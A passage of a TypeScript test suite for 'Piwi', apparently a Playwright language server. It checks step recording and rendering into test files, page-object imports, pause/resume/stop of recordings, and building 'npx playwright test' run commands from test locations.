        ['Find the breaking commit in the desktop app', { root: dir, executionId: 900, kind: 'bisect' }],
        [
          'Run Flake Lab on its untested suspects in the desktop app',
          { root: dir, executionId: 900, testCaseId: 3, kind: 'flake-lab' },
        ],
      ]);
    } finally {
      fs.rmSync(desktopFile, { force: true });
      stopBeside();
      beside.dispose();
    }
  });
});

describe('recording from the editor', () => {
  const pay = (pageUrl: string): RecordedStep => ({
    action: 'fill',
    target: {
      tagName: 'input',
      role: 'textbox',
      accessibleName: 'Amount',
      testId: 'not-on-the-page',
      text: null,
      alternatives: [{ locator: "getByTestId('not-on-the-page')", method: 'getByTestId', score: 100 }],
    },
    value: '42',
    redacted: false,
    pageUrl,
    timestamp: 2,
  });
  const goto = (url: string): RecordedStep => ({
    action: 'goto',
    target: null,
    value: url,
    redacted: false,
    pageUrl: url,
    timestamp: 1,
  });
  const payNow: RecordedStep = {
    action: 'click',
    target: {
      tagName: 'button',
      role: 'button',
      accessibleName: 'Pay now',
      testId: null,
      text: 'Pay now',
      alternatives: [{ locator: "getByRole('button', { name: 'Pay now' })", method: 'getByRole', score: 90 }],
    },
    value: null,
    redacted: false,
    pageUrl: 'https://shop.test/checkout',
    timestamp: 3,
  };

  let recorder: MessageConnection;
  let stopRecorder: () => void;
  let distDir = '';
  const updates: RecordingUpdate[] = [];
  const launchers: Array<{ cwd: string; events: LauncherEvents; sent: ServiceToLauncher[] }> = [];
  const optionsRead: string[] = [];

  beforeAll(async () => {
    distDir = fs.mkdtempSync(path.join(os.tmpdir(), 'piwi-editor-dist-'));
    fs.writeFileSync(path.join(distDir, 'record-ide.js'), '');
    fs.writeFileSync(path.join(distDir, 'record-ide-messages.json'), JSON.stringify({ en: { a: { message: 'A' } } }));
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    stopRecorder = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
      distDir,
      readProjectOptions: async (configFile) => {
        optionsRead.push(configFile);
        return {
          configFile,
          rootDir: dir,
          projects: [{ name: 'chromium', testDir: path.join(dir, 'tests'), use: { baseURL: 'https://shop.test/' } }],
        };
      },
      launchRecorder: (cwd, events) => {
        const launcher = { cwd, events, sent: [] as ServiceToLauncher[] };
        launchers.push(launcher);
        return { send: (m) => launcher.sent.push(m), kill: () => {} };
      },
    });
    recorder = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    recorder.onNotification('piwi/recordingChanged', (u: RecordingUpdate) => {
      updates.push(u);
    });
    recorder.listen();
    await recorder.sendRequest('initialize', {
      processId: null,
      rootUri: null,
      capabilities: {},
      workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
    });
    await recorder.sendNotification('initialized', {});
    await waitFor(async () => {
      const s = (await recorder.sendRequest('piwi/status')) as StatusResult;
      return s.contexts[0]?.connected ? s : undefined;
    });
  });

  afterAll(() => {
    stopRecorder?.();
    recorder?.dispose();
    fs.rmSync(distDir, { recursive: true, force: true });
  });

  const openHere = (file: string, text: string) =>
    recorder.sendNotification('textDocument/didOpen', {
      textDocument: { uri: uri(file), languageId: 'typescript', version: 1, text },
    });

  test('offers the page expressions at the caret, and where it is', async () => {
    const text = [
      "import { test } from '@playwright/test';",
      "test('approves', async ({ adminPage, userPage }) => {",
      "  await userPage.goto('/inbox');",
      '',
      '});',
    ].join('\n');
    await openHere('tests/approve.spec.ts', text);
    const result = (await recorder.sendRequest('piwi/pageCandidates', {
      uri: uri('tests/approve.spec.ts'),
      line: 3,
      character: 0,
    })) as PageCandidatesResult;
    expect(result).toEqual({
      context: 'test',
      default: 'userPage',
      candidates: [
        { expression: 'userPage', reason: 'used on line 3' },
        { expression: 'page', reason: "Playwright's page fixture" },
        { expression: 'adminPage', reason: 'may be a page object' },
      ],
    });
    const atTop = (await recorder.sendRequest('piwi/pageCandidates', {
      uri: uri('tests/approve.spec.ts'),
      line: 0,
      character: 0,
    })) as PageCandidatesResult;
    expect(atTop).toMatchObject({ context: 'file', default: 'userPage' });
  });

  test('renders steps on the page expression at the caret, with their imports apart when asked', async () => {
    const steps = toStepsDocument(
      buildSession([goto('https://shop.test/checkout'), pay('https://shop.test/checkout')], 1),
    );
    const inPageObject = (await recorder.sendRequest('piwi/renderSteps', {
      uri: uri('tests/pages/checkout.page.ts'),
      steps: toStepsDocument(buildSession([goto('https://shop.test/checkout'), payNow], 1)),
      line: 2,
      character: 0,
    })) as RenderStepsResult;
    // The first line goes at the caret, the next ones take its line's indentation.
    expect(inPageObject.code).toBe(
      "await this.page.goto('/checkout');\n  await this.page.getByRole('button', { name: 'Pay now' }).click();",
    );
    expect(inPageObject.importEdit).toBeUndefined();

    const separate = (await recorder.sendRequest('piwi/renderSteps', {
      uri: uri('tests/checkout.spec.ts'),
      steps,
      imports: 'separate',
    })) as RenderStepsResult;
    expect(separate.importEdit).toEqual({
      range: { start: { line: 1, character: 0 }, end: { line: 1, character: 0 } },
      newText: "import { CheckoutPage } from 'tests/pages/checkout.page.ts';\n",
    });
    expect(separate.code).not.toContain('// Needs:');
    expect(separate.code).toContain("  await checkoutPage.pay('');");

    const comments = (await recorder.sendRequest('piwi/renderSteps', {
      uri: uri('tests/checkout.spec.ts'),
      steps,
    })) as RenderStepsResult;
    expect(comments.code).toContain("  // Needs: import { CheckoutPage } from 'tests/pages/checkout.page.ts';");
    expect(comments.importEdit).toBeUndefined();
  });

  test('renders steps without the imports the open file has, nor a page object the test declares already', async () => {
    const text = [
      "import { test } from '@playwright/test';",
      'import {',
      '  CheckoutPage,',
      '} from "tests/pages/checkout.page.ts"',
      "test('pays', async ({ page }) => {",
      '  const checkoutPage = new CheckoutPage(page);',
      '',
      '});',
    ].join('\n');
    await openHere('tests/declared.spec.ts', text);
    const rendered = (await recorder.sendRequest('piwi/renderSteps', {
      uri: uri('tests/declared.spec.ts'),
      steps: toStepsDocument(buildSession([goto('https://shop.test/checkout'), pay('https://shop.test/checkout')], 1)),
      line: 6,
      character: 0,
      imports: 'separate',
    })) as RenderStepsResult;
    expect(rendered.importEdit).toBeNull();
    expect(rendered.code).toBe("await page.goto('/checkout');\nawait checkoutPage.pay('');");
  });

  test('writes paths only when the flow was recorded on the baseURL’s origin', async () => {
    const elsewhere = (await recorder.sendRequest('piwi/renderSteps', {
      uri: uri('tests/checkout.spec.ts'),
      steps: toStepsDocument(buildSession([goto('https://staging.shop.test/cart')], 1)),
    })) as RenderStepsResult;
    expect(elsewhere.code).toContain("await page.goto('https://staging.shop.test/cart');");
    const onBase = (await recorder.sendRequest('piwi/renderSteps', {
      uri: uri('tests/checkout.spec.ts'),
      steps: toStepsDocument(buildSession([goto('https://shop.test/cart')], 1)),
    })) as RenderStepsResult;
    expect(onBase.code).toContain("await page.goto('/cart');");
    expect(optionsRead).toContain(path.join(dir, 'playwright.config.ts'));
  });

  test('records into a file through the launcher: the block, pause and resume, and Stop', async () => {
    const text = ["import { test } from '@playwright/test';", "test('pays', async ({ page }) => {", '', '});', ''].join(
      '\n',
    );
    await openHere('tests/recorded.spec.ts', text);
    const result = (await recorder.sendRequest('piwi/record', {
      uri: uri('tests/recorded.spec.ts'),
      line: 2,
      character: 0,
      into: 'steps',
      startUrl: '/checkout',
      language: 'fr',
    })) as RecordResult;
    expect(result).toMatchObject({ ok: true, placement: { line: 2, newLine: false, indent: '  ' } });
    const launcher = launchers[launchers.length - 1]!;
    expect(launcher.cwd).toBe(dir);
    const start = launcher.sent[0] as { type: 'start'; request: LaunchRequest };
    expect(start.request).toMatchObject({
      startUrl: 'https://shop.test/checkout',
      settings: { file: 'recorded.spec.ts', testIdAttribute: null },
      language: { code: 'fr', messages: { a: { message: 'A' } } },
    });

    const count = updates.length;
    launcher.events.message({ type: 'started' });
    launcher.events.message({
      type: 'event',
      event: {
        kind: 'navigate',
        target: null,
        value: 'https://shop.test/checkout',
        checked: null,
        inputType: null,
        isPasswordField: false,
        pageUrl: 'https://shop.test/checkout',
        timestamp: Date.now(),
      },
    });
    const latest = await waitFor(() => (updates.length >= count + 2 ? updates[updates.length - 1] : undefined));
    expect(latest).toMatchObject({
      sessionId: result.sessionId,
      uri: uri('tests/recorded.spec.ts'),
      into: 'steps',
      state: 'recording',
      code: "await page.goto('/checkout');",
    });

    await recorder.sendRequest('piwi/recordingCommand', { sessionId: result.sessionId, command: 'pause' });
    await recorder.sendRequest('piwi/recordingCommand', { sessionId: result.sessionId, command: 'resume' });
    await waitFor(() => (updates.length >= count + 4 ? true : undefined));
    expect(updates[count + 2]).toMatchObject({ state: 'paused', code: "await page.goto('/checkout');" });
    expect(updates[count + 3]).toMatchObject({ state: 'recording', code: "await page.goto('/checkout');" });

    const stopping = recorder.sendRequest('piwi/stopRecording', { sessionId: result.sessionId });
    await waitFor(() =>
      updates.some((u) => u.sessionId === result.sessionId && u.state === 'stopped') ? true : undefined,
    );
    expect(launcher.sent.map((m) => m.type)).toEqual(['start', 'pause', 'pause', 'stop']);
    launcher.events.exit(0, null);
    expect(await stopping).toBeNull();
  });

  test('a new test between the lines of a file; closing the file stops its recording', async () => {
    const text = "import { test } from '@playwright/test';\n\n";
    await openHere('tests/closing.spec.ts', text);
    const result = (await recorder.sendRequest('piwi/record', {
      uri: uri('tests/closing.spec.ts'),
      line: 1,
      character: 0,
      into: 'test',
    })) as RecordResult;
    expect(result).toMatchObject({ ok: true, placement: { line: 1, newLine: false, indent: '' } });
    const launcher = launchers[launchers.length - 1]!;
    launcher.events.message({ type: 'started' });
    await recorder.sendNotification('textDocument/didClose', { textDocument: { uri: uri('tests/closing.spec.ts') } });
    const last = await waitFor(() => updates.find((u) => u.sessionId === result.sessionId && u.state === 'stopped'));
    expect(last.message).toBe('The file was closed: the recording stopped.');
    expect(last.code).toBe("test('recorded flow', async ({ page }) => {\n});");
  });

  test('a file outside every Playwright config cannot be recorded into', async () => {
    const outside = (await recorder.sendRequest('piwi/record', {
      uri: pathToFileURL(path.join(os.tmpdir(), 'nowhere.spec.ts')).href,
      line: 0,
      character: 0,
      into: 'file',
    })) as RecordResult;
    expect(outside).toEqual({
      ok: false,
      message: 'No Playwright config holds this file: open the folder of its playwright.config.ts.',
    });
  });
});

describe('a test the instance does not know yet', () => {
  /** A recorded test below the one the spec holds as saved, in the open file: Playwright runs the file once saved. */
  const RECORDED = [
    "import { test } from '@playwright/test';",
    '',
    "test('pays', async ({ page }) => {});",
    '',
    "test('recorded', async ({ page }) => {",
    "  await page.goto('/checkout');",
    "  await page.getByRole('button', { name: 'Pay now' }).click();",
    '});',
    '',
  ].join('\n');

  let repo = '';
  let local: MessageConnection;
  let stopLocal: () => void;
  const notices: Notice[] = [];
  const specUri = () => pathToFileURL(path.join(repo, 'tests/checkout.spec.ts')).href;
  const at = (line: number) =>
    local.sendRequest('piwi/testAt', { uri: specUri(), line, character: 0 }) as Promise<TestAtResult>;
  const runArgs = (args: Partial<RunTestsArgs>) =>
    local.sendRequest('piwi/runArgs', { uri: specUri(), testIds: [], ...args }) as Promise<RunCommand | null>;

  beforeAll(async () => {
    repo = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'piwi-editor-local-')));
    execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: repo, stdio: 'ignore' });
    fs.writeFileSync(path.join(repo, 'playwright.config.ts'), 'export default {};\n');
    fs.mkdirSync(path.join(repo, 'tests'));
    fs.writeFileSync(path.join(repo, 'tests/checkout.spec.ts'), SPEC);
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    // No instance: nothing names one.
    stopLocal = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
    });
    local = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    local.onNotification('piwi/notice', (n: Notice) => {
      notices.push(n);
    });
    local.listen();
    await local.sendRequest('initialize', {
      processId: null,
      rootUri: null,
      capabilities: {},
      workspaceFolders: [{ uri: pathToFileURL(repo).href, name: 'shop' }],
    });
    await local.sendNotification('initialized', {});
    await waitFor(async () => {
      const s = (await local.sendRequest('piwi/status')) as StatusResult;
      return s.contexts.length ? s : undefined;
    });
  });

  afterAll(() => {
    stopLocal?.();
    local?.dispose();
    fs.rmSync(repo, { recursive: true, force: true });
  });

  test('is found by its location in the text as it stands, and run there', async () => {
    await local.sendNotification('textDocument/didOpen', {
      textDocument: { uri: specUri(), languageId: 'typescript', version: 1, text: RECORDED },
    });
    expect(await at(2)).toEqual({ test: null, spec: null, location: 'tests/checkout.spec.ts:3' });
    for (const line of [4, 6, 7]) {
      expect(await at(line)).toEqual({ test: null, spec: null, location: 'tests/checkout.spec.ts:5' });
    }
    expect(await at(1)).toEqual({ test: null, spec: null, location: null });
    expect(await at(8)).toEqual({ test: null, spec: null, location: null });

    const run = await runArgs({ locations: ['tests/checkout.spec.ts:5'] });
    expect(run).toEqual({
      cwd: repo,
      args: ['tests/checkout.spec.ts:5'],
      command: 'npx playwright test tests/checkout.spec.ts:5',
      env: { PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: run?.ref },
      ref: expect.stringMatching(/^ed-[0-9a-f]{8}$/),
    });
    // Without a location, a test is run by its id, which needs an instance.
    expect(await runArgs({ testIds: [1] })).toBeNull();
    // A location that is not a spec under the config's folder runs nothing.
    for (const location of ['tests/missing.spec.ts:3', 'playwright.config.ts:1', '../checkout.spec.ts:3', 'x']) {
      expect(await runArgs({ locations: ['tests/checkout.spec.ts:3', location] }), location).toBeNull();
    }
  });

  test('three times: headless, without retries, and said from its exit code once it ended', async () => {
    const verify = await runArgs({
      locations: ['tests/checkout.spec.ts:5'],
      repeat: 3,
      breakpoints: [{ uri: specUri(), line: 6 }],
    });
    expect(verify).toEqual({
      cwd: repo,
      args: ['tests/checkout.spec.ts:5', '--repeat-each=3', '--retries=0'],
      command: 'npx playwright test tests/checkout.spec.ts:5 --repeat-each=3 --retries=0',
      env: { PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: verify?.ref },
      ref: expect.stringMatching(/^ed-[0-9a-f]{8}$/),
    });
    expect(await runArgs({ locations: ['tests/checkout.spec.ts:5'], repeat: 0 })).toBeNull();

    await local.sendNotification('piwi/commandEnded', { ref: verify!.ref, exitCode: 1 });
    expect(await waitFor(() => notices[0])).toEqual({
      root: repo,
      severity: 'warning',
      message: 'Failed at least 1 of 3: tests/checkout.spec.ts:5 (exit code 1)',
    });
    // A run of each test once says nothing of its own.
    const once = await runArgs({ locations: ['tests/checkout.spec.ts:5'] });
    await local.sendNotification('piwi/commandEnded', { ref: once!.ref, exitCode: 0 });
    await new Promise((resolve) => setTimeout(resolve, 200));
    expect(notices).toHaveLength(1);
  });
});

describe('the bundle', () => {
  test('answers initialize over stdio', async (ctx) => {
    const bundle = path.join(__dirname, '..', 'dist', 'piwi-language-server.cjs');
    if (!fs.existsSync(bundle)) return ctx.skip();
    const child = spawn(process.execPath, [bundle, '--stdio'], { stdio: ['pipe', 'pipe', 'inherit'] });
    const connection = createMessageConnection(
      new StreamMessageReader(child.stdout!),
      new StreamMessageWriter(child.stdin!),
    );
    connection.listen();
    const result = (await connection.sendRequest('initialize', {
      processId: null,
      rootUri: null,
      capabilities: {},
    })) as {
      serverInfo: { name: string };
    };
    expect(result.serverInfo.name).toBe('Piwi');
    connection.dispose();
    child.kill();
  });
});
